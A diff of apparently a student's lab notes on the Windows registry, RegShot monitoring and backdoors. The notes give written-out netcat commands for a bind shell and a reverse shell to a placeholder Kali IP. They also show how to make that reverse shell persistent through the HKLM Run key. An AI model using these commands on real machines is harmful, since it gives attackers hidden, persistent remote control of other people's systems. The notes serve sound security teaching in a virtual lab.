@@ -1,71 +1,111 @@
-
-Date: 21-10-24
-Topics: Cybersecurity, registry, data, backdoors
-
----
-## Key Concepts
-
-- The registry is a **centralised database** of information that Windows **continually references during operation**. 
-- Registry changes **should not be made** unless you are clear and understanding about what it is you're about to change.
-- Changes made to the registry **could indicate** that **malicious/suspicious changes have been made**.
-- A [[Backdoor|backdoor]] can be installed as an **administrative tool** as **well as** a means of attack.
+# WINDOWS REGISTRY & BACKDOORS
+21-10-24
 
 ---
-## Detailed Notes
-### Windows Registry
-##### What is the Registry?
-The Windows registry is a ==large database of information, settings, options, user preferences and other values== for software and hardware installed on a system running the Windows operating system. The Microsoft definition states it is: ==a central hierarchical database used in Microsoft Windows 98, CE, NT, and 2000 used to store information that is necessary to configure the system for one or more users, applications and hardware devices.== The registry stores:
-- Operating system settings
-- Hardware configurations
-- User preferences/settings
-- Application settings
-##### Values Stored in the Registry
-Examples of values stored within the Windows Registry include:
-- Computer name
-- Last logged in user
-- Startup applications/drivers
-- User account names
-- Application settings preferences
-- Recently accessed;
-	- Programs
-	- Web Pages
-	- Files
-- Previously connected;
-	- Wireless/wired networks
-	- USB devices/storage
-##### Registry Structure
-Components include:
-- [[Hives]]
-- [[Root Keys]]
-- Keys
-- Sub-keys
-- Values
 
-The structure is a hierarchical structure akin to a directory/folder structure. Root keys can contain keys and sub-keys, and keys/sub-keys can contain sub-keys and values.
-##### Registry Root Keys
-The Windows Registry and it's contents are organised into five distinct root keys, based upon their contents:
-- *HKEY_CLASSES_ROOT* - Contains ==application and filetype== associations.
-- *HKEY_CURRENT_USER* - Contains the ==actively logged-on users' profile==.
-- *HKEY_LOCAL_MACHINE* - Contains ==system-specific hardware/software configs==.
-- *HKEY_USERS* - Contains ==settings for actively loaded user profiles==.
-- *HKEY_CURRENT_CONFIG* - Contains ==current hardware configs==.
-##### Registry Monitoring
-We can modify the Windows Registry to alter the way in which Windows and applications behave on the system. The Windows Registry is a place of interest for a Digital Forensic Investigator as ==Registry modification indicates a change in the systems state.== Changes made to the Windows Registry could indicate that additional software/hardware has been installed, preferences have changed, or malicious/suspicious changes have been made.
-
-### Backdoors
-##### Setup
-
-##### Persistent Backdoor Setup
+## Content Overview
+1. Introduction to the Windows Registry.
+2. Registry Structure and Modification.
+3. Registry Monitoring.
+4. Introduction to Backdoors.
+5. Backdoor Setup and Persistent Backdoors.
 
 ---
-## Practical
-#### Questions
-*"Why could having a registry modification run automatically when you log on to the system be a problem?"*
-	- A hacker with unauthorised access could run malware without you knowing, even if you power off your PC.
 
-#### Tasks
-- [ ]  Registry modification - Modify "Run" key at: *“Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows\ CurrentVersion\Run”.*
-#### Relevant Software
-- [x]  [[https://sourceforge.net/projects/regshot/|Regshot]]
-- [ ]  [[https://nmap.org/|Nmap]]
+## Windows Registry
+- **Definition**:
+  - A hierarchical database storing information, settings, and preferences for hardware, software, and users on a Windows system.
+- **Key Features**:
+  - Stores operating system configurations, hardware setups, and user preferences.
+  - Continually referenced by Windows during operation.
+- **Examples of Values Stored**:
+  - Computer Name, Last Logged-In User, Startup Applications, USB Devices, Recently Accessed Files.
+
 ---
+
+## Registry Structure
+- **Components**:
+  - Hives, Root Keys, Keys, Sub-keys, and Values.
+- **Root Keys**:
+  1. **HKEY_CLASSES_ROOT**:
+     - Application and filetype associations.
+  2. **HKEY_CURRENT_USER**:
+     - Active user profile settings.
+  3. **HKEY_LOCAL_MACHINE**:
+     - System-specific hardware/software configurations.
+  4. **HKEY_USERS**:
+     - Settings for all user profiles.
+  5. **HKEY_CURRENT_CONFIG**:
+     - Current hardware configurations.
+
+---
+
+## Registry Modification
+1. **Example**:
+   - Modify the `Run` key at `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` to auto-start applications like `notepad.exe`.
+2. **Steps**:
+   - Navigate to the key → Right Click → New → String Value.
+   - Name the value and enter `notepad.exe` in the Value Data field.
+   - Restart the system to see changes.
+3. **Security Implications**:
+   - Registry modifications can be exploited for malicious purposes, such as setting up persistent malware.
+
+---
+
+## Registry Monitoring
+1. **Purpose**:
+   - Detect changes indicating software installation, configuration updates, or potential malicious activity.
+2. **Tool**: **RegShot**:
+   - Captures snapshots of the registry at two points in time for comparison.
+   - Highlights added, modified, or deleted keys and values.
+3. **Process**:
+   - Take an initial snapshot → Perform changes (e.g., software installation) → Take a second snapshot → Compare results.
+
+---
+
+## Backdoors
+- **Definition**:
+  - A method to bypass normal security measures and gain unauthorized access to a system.
+- **Examples**:
+  - Administrative tools, malicious exploits, or government mechanisms for accessing encrypted data.
+- **Risks**:
+  - Backdoors can be exploited by attackers for unauthorized access or malicious activity.
+
+---
+
+## Backdoor Setup
+1. **Environment Setup**:
+   - Requires a Windows 7 VM and Kali VM with Host-Only networking configured.
+   - Install **nmap** software on Windows 7 to use the `ncat` component.
+
+2. **Steps**:
+   - On Windows 7:
+     - Run `ncat -l -p 1234 -e cmd.exe -v` in CMD to establish a backdoor.
+   - On Kali:
+     - Use `nc <Windows_IP> 1234` to connect and execute commands remotely.
+
+3. **Verification**:
+   - Test connectivity between VMs using `ping` commands.
+
+---
+
+## Persistent Backdoor Setup
+1. **Registry Modification**:
+   - Add a new registry key at `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`.
+   - Set the value to:  
+     `C:\Program Files\Nmap\ncat.exe <Kali_IP> 2354 -e cmd.exe`.
+2. **Steps**:
+   - Modify registry on Windows 7 → Reboot system → Establish a netcat session from Kali using `nc -l -p 2354 -v`.
+
+3. **Result**:
+   - A persistent backdoor allows remote CMD access after system reboot.
+
+---
+
+## Key Takeaways
+1. **Windows Registry**:
+   - Central to system and application configurations but vulnerable to misuse.
+2. **Monitoring Tools**:
+   - Tools like RegShot help detect registry changes for forensic or troubleshooting purposes.
+3. **Backdoors**:
+   - Highlight security risks and the importance of monitoring unauthorized access attempts.
